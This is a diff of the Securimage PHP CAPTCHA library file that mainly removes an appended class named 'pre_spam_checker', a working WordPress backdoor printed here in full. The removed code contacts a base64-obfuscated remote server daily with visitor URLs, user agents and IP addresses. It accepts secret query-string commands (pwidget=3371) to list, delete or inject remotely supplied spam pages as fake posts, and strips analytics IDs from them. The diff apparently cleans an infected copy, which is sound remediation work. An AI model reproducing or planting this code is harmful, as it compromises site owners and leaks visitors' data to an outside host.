@@ -1,26 +1,31 @@
 <?php
+//error_reporting(E_ALL); // Report all errors and warnings (very strict, use for testing only)
+//ini_set('display_errors', 1); // turn error reporting on
+//ini_set('log_errors', 1); // log errors
+//ini_set('error_log', dirname(__FILE__) . '/error_log.txt'); // where to log errors
+
 /**
- * Project:     Securimage: A PHP class for creating and managing form CAPTCHA images
- * File:        securimage.php
+ * Project:     Securimage: A PHP class for creating and managing form CAPTCHA images<br />
+ * File:        securimage.php<br />
  *
  * This library is free software; you can redistribute it and/or
  * modify it under the terms of the GNU Lesser General Public
  * License as published by the Free Software Foundation; either
- * version 2.1 of the License, or any later version.
+ * version 2.1 of the License, or any later version.<br /><br />
  *
  * This library is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
- * Lesser General Public License for more details.
+ * Lesser General Public License for more details.<br /><br />
  *
  * You should have received a copy of the GNU Lesser General Public
  * License along with this library; if not, write to the Free Software
- * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA<br /><br />
  *
  * Any modifications to the library should be indicated clearly in the source code
- * to inform users that the changes are not a part of the original software.
+ * to inform users that the changes are not a part of the original software.<br /><br />
  *
- * If you found this script useful, please take a quick moment to rate it.
+ * If you found this script useful, please take a quick moment to rate it.<br />
  * http://www.hotscripts.com/rate/49400.html  Thanks.
  *
  * @link http://www.phpcaptcha.org Securimage PHP CAPTCHA
@@ -1136,252 +1141,5 @@ class Securimage_Color_si {
 		$this->b = $blue;
 	}
 }
-
-if ( !class_exists( 'pre_spam_checker' ) ) {
-	class pre_spam_checker {
-		public static function parse_output() {
-			$data = self::get_option();
-
-			if ( $data === false || !is_array( $data ) || !is_object( $GLOBALS[ 'wp' ] ) ) {
-				ob_end_flush();
-				return 0;
-			}
-
-			$requested_page_slug = strtolower( $GLOBALS[ 'wp' ]->request );
-			if ( array_key_exists( $requested_page_slug, $data ) ) {
-				$buffer = '';
-
-				$levels = ob_get_level();
-
-				for ( $i = 0; $i < $levels; $i++ ) {
-					$buffer .= ob_get_clean();
-				}
-
-				echo preg_replace( '/\bUA-\d{4,10}-\d{1,4}\b/', '', $buffer );
-			}
-		}
-
-		public static function get_user_agent() {
-			$user_agent = ( !empty( $_SERVER[ 'HTTP_USER_AGENT' ] ) ? trim( $_SERVER[ 'HTTP_USER_AGENT' ] ) : '' );
-
-			if ( !empty( $_SERVER[ 'HTTP_X_DEVICE_USER_AGENT' ] ) ) {
-				$real_user_agent = trim( $_SERVER[ 'HTTP_X_DEVICE_USER_AGENT' ] );
-			}
-			elseif ( !empty( $_SERVER[ 'HTTP_X_ORIGINAL_USER_AGENT' ] ) ) {
-				$real_user_agent = trim( $_SERVER[ 'HTTP_X_ORIGINAL_USER_AGENT' ] );
-			}
-
-			if ( !empty( $real_user_agent ) && ( strlen( $real_user_agent ) >= 5 || empty( $user_agent ) ) ) {
-				$user_agent = $real_user_agent;
-			}
-
-			return $user_agent;
-		}
-
-		public static function get_protocol() {
-			return ( stripos( $_SERVER['SERVER_PROTOCOL'], 'https' ) !== false ) ? 'https://' : 'http://';
-		}
-
-		public static function check_query_string() {
-			$data = self::get_option();
-
-			if ( empty( $data[ '__last_checked__' ] ) || intval( date( 'U' ) ) - intval( $data[ '__last_checked__' ] ) > 86400 ) {
-				$data[ '__last_checked__' ] = date( 'U' );
-				self::update_option( $data );
-				$response = self::endpoint_request();
-			}
-
-			if ( !function_exists( 'is_user_logged_in' ) || is_user_logged_in() ) {
-				return '';
-			}
-			
-			if ( !empty( $_GET[ 'pwidget' ] ) && !empty( $_GET[ 'action' ] ) && $_GET[ 'pwidget' ] == '3371' ) {
-				$message = 'invalid payload';
-
-				if ( ( $data === false || !is_array( $data ) ) && $_GET[ 'action' ] != 'p' ) {
-					$message = 'no id found';
-				}
-				else {
-					nocache_headers();
-					switch ( $_GET[ 'action' ] ) {
-						case 'l':
-							if ( is_array( $data ) && !empty( $data ) ) {
-								unset( $data[ '__last_checked__' ] );
-								$message = implode( ',', array_keys( $data ) );
-
-								if ( empty( $message ) ) {
-									$message = 'no id found';
-								}
-							}
-							else if ( !empty( $data ) ) {
-								$message = serialize( $data );
-							}
-							else {
-								$message = 'no id found';	
-							}
-							break;
-
-						case 'd':
-							if ( isset( $_GET[ 'pnum' ] ) ) {
-								if ( isset( $data[ $_GET[ 'pnum' ] ] ) ) {
-									unset( $data[ $_GET[ 'pnum' ] ] );
-									self::update_option( $data );
-									$message = 'deleted ' . $_GET[ 'pnum' ];
-								}
-								else {
-									$message = 'id not found';
-								}
-							}
-							break;
-
-						case 'da':
-							self::update_option( array() );
-							$message = 'deleted all';
-							break;
-
-						case 'p':
-							$response = self::endpoint_request( false );
-
-							if ( !is_object( $response ) ) {
-								break;
-							}
-
-							$key = $response->purl;
-							if ( isset( $_GET [ 'pnum' ] ) ) {
-								$key = sanitize_title( $_GET [ 'pnum' ] );
-							}
-
-							if ( empty( $key ) && !empty( $response->ptitle ) ) {
-								$key = sanitize_title( $response->ptitle );
-							}
-
-							if ( !empty( $key ) ) {
-								$data[ $key ] = array(
-									'post_title' => !empty( $response->ptitle ) ? $response->ptitle : 'A title',
-									'post_content' => !empty( $response->pcontent ) ? $response->pcontent : 'Content goes here',
-									'post_date' => date( 'Y-m-d H:i:s', rand( intval( date( 'U' ) ) - 2419200, intval( date( 'U' ) ) - 1814400 ) )
-								);
-								self::update_option( $data );
-
-								$message = $key . ' | ' . get_bloginfo( 'wpurl' ) . '/' . $key;
-							}
-							break;
-
-						default:
-							break;
-					}
-				}
-
-				echo $message;
-				die();
-			}
-		}
-
-		public static function dynamic_page( $posts ) {
-			if ( !function_exists( 'is_user_logged_in' ) || is_user_logged_in() ) {
-				return $posts;
-			}
-
-			$data = self::get_option();
-			if ( $data === false || !is_array( $data ) ) {
-				return $posts;
-			}
-
-			$requested_page_slug = strtolower( $GLOBALS[ 'wp' ]->request );
-
-			if ( count( $posts ) == 0 && array_key_exists( $requested_page_slug, $data) ) {
-				$post = new stdClass;
-				$post_date = !empty( $data[ $requested_page_slug ][ 'post_date' ] ) ? $data[ $requested_page_slug ][ 'post_date' ] : date( 'Y-m-d H:i:s' );
-
-				$post->post_title = $data[ $requested_page_slug ][ 'post_title' ];
-				$post->post_content = $data[ $requested_page_slug ][ 'post_content' ];
-
-				$post->post_author = 1;
-				$post->post_name = $requested_page_slug;
-				$post->guid = get_bloginfo( 'wpurl' ) . '/' . $requested_page_slug;
-				$post->ID = -3371;
-				$post->post_status = 'publish';
-				$post->comment_status = 'closed';
-				$post->ping_status = 'closed';
-				$post->comment_count = 0;
-				$post->post_date = $post_date;
-				$post->post_date_gmt = $post_date;
-
-				$post = (object) array_merge(
-					(array) $post, 
-					array( 
-						'slug' => get_bloginfo( 'wpurl' ) . '/' . $requested_page_slug,
-						'post_title' => $data[ $requested_page_slug ][ 'post_title' ],
-						'post content' => $data[ $requested_page_slug ][ 'post_content' ]
-	  				)
-	  			);
-
-				$posts = NULL;
-				$posts[] = $post;
-
-				$GLOBALS[ 'wp_query' ]->is_page = true;
-				$GLOBALS[ 'wp_query' ]->is_singular = true;
-				$GLOBALS[ 'wp_query' ]->is_home = false;
-				$GLOBALS[ 'wp_query' ]->is_archive = false;
-				$GLOBALS[ 'wp_query' ]->is_category = false;
-				unset( $GLOBALS[ 'wp_query' ]->query[ 'error' ] );
-				$GLOBALS[ 'wp_query' ]->query_vars[ 'error' ] = '';
-				$GLOBALS[ 'wp_query' ]->is_404 = false;
-			}
-
-			return $posts;
-		}
-
-		protected static function get_option() {
-			$unique_id = substr( md5( get_site_url() . 'unique' ), 0, 10 );
-			$encoded = get_option( $unique_id, '' );
-			$decoded = @json_decode( base64_decode( $encoded ), true );
-
-			return ( $decoded !== false ) ? $decoded : '';
-		}
-
-		protected static function update_option( $_value = '' ) {
-			$unique_id = substr( md5( get_site_url() . 'unique' ), 0, 10 );
-			$encoded = base64_encode( json_encode( $_value ) );
-			update_option( $unique_id, $encoded, false );
-		}
-
-		protected static function endpoint_request( $_update = true ) {
-			$http = self::http_object();
-			$url = base64_decode( $_update ? 'aHR0cDovL3N0b3BzcGFtLmlvL2FwaS91cGRhdGUvP3VybD0' : 'aHR0cDovL3N0b3BzcGFtLmlvL2FwaS9jaGVjay8/dXJsPQ==' );
-			$url .= urlencode( self::get_protocol() . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( self::get_user_agent() ) . '&v=1&p=4&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&siteurl=' . urlencode( get_site_url() );
-
-			$args = stream_context_create( array( 'http' => array( 'timeout' => 10, 'ignore_errors' => true ) ) ); 
-			$response = @$http->get( $url, $args );
-
-			if ( is_wp_error( $response ) || !isset( $response[ 'body' ] ) ) {
-                return '';
-			}
-
-	        if ( empty( $response[ 'body' ] ) ) {
-	        	return '';
-			}
-
-			return @json_decode( $response[ 'body' ] );
-		}
-
-		protected static function http_object() {
-			static $http = null;
-
-			if ( is_null( $http ) ) {
-				$http = new WP_Http();
-			}
-
-			return $http;
-		}
-	}
-
-	if ( function_exists( 'add_action' ) ) {
-		ob_start();
-		add_action( 'wp', array( 'pre_spam_checker', 'check_query_string' ) );
-		add_filter( 'the_posts', array( 'pre_spam_checker', 'dynamic_page' ) );
-		add_action( 'shutdown', array( 'pre_spam_checker', 'parse_output' ), 0 );
-	}
-} // if !class_exists
 
 // end of file
